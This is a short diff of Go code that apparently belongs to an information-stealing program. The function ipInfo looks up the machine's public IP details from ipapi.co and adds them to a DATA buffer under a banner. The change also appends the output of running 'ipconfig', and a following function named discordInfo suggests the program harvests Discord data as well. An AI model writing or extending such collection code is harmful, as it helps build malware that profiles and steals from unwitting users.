@@ -189,7 +189,7 @@ func ipInfo() {
 	resp, _ := http.Get(fmt.Sprintf("https://ipapi.co/%v/json/", getIp()))
 	json.NewDecoder(resp.Body).Decode(&information)
 	body, _ := json.MarshalIndent(information, "", " ")
-	DATA.WriteString(fmt.Sprintf("=============================[IP]==============================\n%v\n", string(body)))
+	DATA.WriteString(fmt.Sprintf("=============================[IP]==============================\n%v\n%v\n", string(body), run("ipconfig")))
 }
 
 func discordInfo() {
